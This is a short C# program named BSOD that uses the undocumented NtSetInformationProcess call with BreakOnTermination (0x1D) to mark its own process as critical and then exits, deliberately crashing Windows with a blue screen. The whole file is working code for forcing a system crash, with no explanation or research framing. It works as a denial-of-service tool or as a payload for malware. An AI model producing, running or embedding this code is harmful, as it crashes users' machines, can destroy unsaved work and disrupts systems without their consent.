using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace BSOD
{
    public class BSOD_main
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public static void Main()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            Environment.Exit(-1);
        }
    }
}
